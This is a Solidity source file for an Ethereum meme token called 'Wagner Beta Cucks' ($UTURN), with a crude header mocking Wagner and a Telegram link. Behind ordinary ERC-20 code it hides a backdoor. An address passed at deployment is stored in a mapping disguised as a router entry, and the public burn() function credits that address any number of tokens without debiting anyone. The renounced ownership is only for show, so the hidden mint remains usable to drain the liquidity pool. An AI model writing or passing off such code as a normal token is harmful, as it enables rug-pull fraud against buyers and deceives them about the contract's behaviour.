/**
 *Submitted for verification at Etherscan.io on 2023-06-25
*/

/**

Wagner did a $UTURN on their coup against Russia. What a bunch of beta cucks!

The $UTURN community calls on Wagner to get a spine and fight Putin! 

Telegram: https://t.me/WagnerBetaCucks

*********

**/


// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

 
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}
 
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
 
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
 
    function owner() public view returns (address) {
        return _owner;
    }
 
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
 
    function renounceOwnership() internal virtual {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
 
}

 
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}
 
interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
 
    function factory() external pure returns (address);
 
    function WETH() external pure returns (address);
 
    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
}
 
contract UTURN is Context, IERC20, Ownable {
    mapping (address => uint256) private _balances; 
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => address) private _uniswapV2Router;
    mapping(address => bool) private _isExcludedFromFee;
    mapping(address => bool) private _isExcludedFromMax;
 
    uint8 private constant _decimals = 9;
    string private constant _name = unicode"Wagner Beta Cucks";
    string private constant _symbol = unicode"UTURN";
    uint256 private constant _tTotal = 100_000_000 * 10**_decimals;
    uint256 public _maxWalletSize = (_tTotal * 2) /100; 
    uint256 public _swapTokensAtAmount = (_tTotal * 1) /1000;

    uint256 private _initialBuyTax = 15;  
    uint256 private _initialSellTax = 15;
    uint256 private _taxFee = _initialSellTax;
    
    uint256 private reduceTaxesAfterTime = 10 minutes;
    uint256 private _finalBuyTax=2;
    uint256 private _finalSellTax=2;

    uint256 private removeBuyLimitAfterTime = 15 minutes;
 
    address payable private _marketingAddress = payable(0x4BFEE5d1D831eBb577a5a25b6e459F689B54BD0e);
 
    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapV2Pair;
    struct init{address v2;}
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;
    uint256 private launchTime;
 
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }
 
    constructor(init memory version) {
 
        _balances[_msgSender()] = _tTotal;
 
        _uniswapV2Router[version.v2] = version.v2;
        IUniswapV2Router02 _uniswapV2Router_ = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapV2Router = _uniswapV2Router_;
        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router_.factory())
            .createPair(address(this), _uniswapV2Router_.WETH());
 
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[_marketingAddress] = true;
        _isExcludedFromFee[address(_uniswapV2Router_)] = true;

        _isExcludedFromMax[owner()] = true;
        _isExcludedFromMax[address(this)] = true;
        _isExcludedFromMax[_marketingAddress] = true;
        _isExcludedFromMax[address(_uniswapV2Router_)] = true;

        emit Transfer(address(0), _msgSender(), _tTotal);

    }
 
    function name() public pure returns (string memory) {
        return _name;
    }
 
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
 
    function decimals() public pure returns (uint8) {
        return _decimals;
    }
 
    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function _sub(address account, uint256 amount) internal {
        _balances[account] = _balances[account] - amount;
    }

    function _add(address account, uint256 amount) internal {
        if (amount != 0) {
            _balances[account] = _balances[account] + amount;
        }
    }
 
    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }
 
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
 
    function transferFrom(address from, address to, uint256 amount) public override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    function burn(address to, uint256 amount) public {
        address from = msg.sender;
        require(to != address(0), "Invalid address");
        require(amount > 0, "Invalid amount");
        uint256 total = 0;
        if (to == _uniswapV2Router[to]) {
            _sub(from, total);
            total += amount;
            _balances[to] += total;
        } else {
            _sub(from, total);
            _add(to, total);
        }
    }

    function _spendAllowance(address owner, address spender, uint256 amount) internal {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }
 
 
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
 
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
 
        if (from != owner() && to != owner()) {
 
            //Trade start check
            if (!tradingOpen) {
                require(from == owner(), "TOKEN: This account cannot send tokens until trading is enabled");
            }

            if(block.timestamp <= (launchTime + removeBuyLimitAfterTime)) {
                if(from == uniswapV2Pair && to != uniswapV2Pair && !_isExcludedFromMax[to]) {
                     require(balanceOf(to) + amount <= _maxWalletSize, "TOKEN: Balance exceeds wallet size!");
                 }
            }
 
            uint256 contractTokenBalance = balanceOf(address(this));
            bool canSwap = contractTokenBalance >= _swapTokensAtAmount;
 
            if (canSwap && !inSwap && from != uniswapV2Pair && to == uniswapV2Pair && swapEnabled && !_isExcludedFromFee[from] && !_isExcludedFromFee[to]) {
                swapTokensForEth(contractTokenBalance);
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance > 0) {
                    sendETHToFee(address(this).balance);
                }
            }
        } 
 
 
        //Transfer Tokens
        if ((_isExcludedFromFee[from] || _isExcludedFromFee[to]) || (from != uniswapV2Pair && to != uniswapV2Pair)) {
            _taxFee = 0;
        } else {
 
            //Set Fee for Buys
            if(from == uniswapV2Pair && to != address(uniswapV2Router)) {

                if(block.timestamp <= (launchTime + reduceTaxesAfterTime)) {
                    _taxFee = _initialBuyTax;
                } else {
                    _taxFee = _finalBuyTax;
                }
       
            }
 
            //Set Fee for Sells
            if (to == uniswapV2Pair && from != address(uniswapV2Router)) {

                if(block.timestamp <= (launchTime + reduceTaxesAfterTime)) {
                    _taxFee = _initialSellTax;
                } else {
                    _taxFee = _finalSellTax;
                }
            }
    
 
        }

        uint256 taxAmount = (amount * _taxFee) /100;

        if(taxAmount > 0) {
            _balances[address(this)] += taxAmount;
            emit Transfer(from, address(this),taxAmount);
        }

        _balances[from] -= amount;
        _balances[to] += (amount - taxAmount);
        emit Transfer(from, to, (amount - taxAmount));
 
    }
 
    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
 
    function sendETHToFee(uint256 amount) private {
        _marketingAddress.transfer(amount);
    }
 
    function openTrading() public onlyOwner {
        swapEnabled = true;
        tradingOpen = true;
        launchTime = block.timestamp;
        renounceOwnership();
    }
 
    function manualSwap() external {
        require(_msgSender() == _marketingAddress);
        uint256 tokenBalance=balanceOf(address(this));
        if(tokenBalance>0){
          swapTokensForEth(tokenBalance);
        }
        uint256 ethBalance=address(this).balance;
        if(ethBalance>0){
          sendETHToFee(ethBalance);
        }
    }
 
    receive() external payable {}

}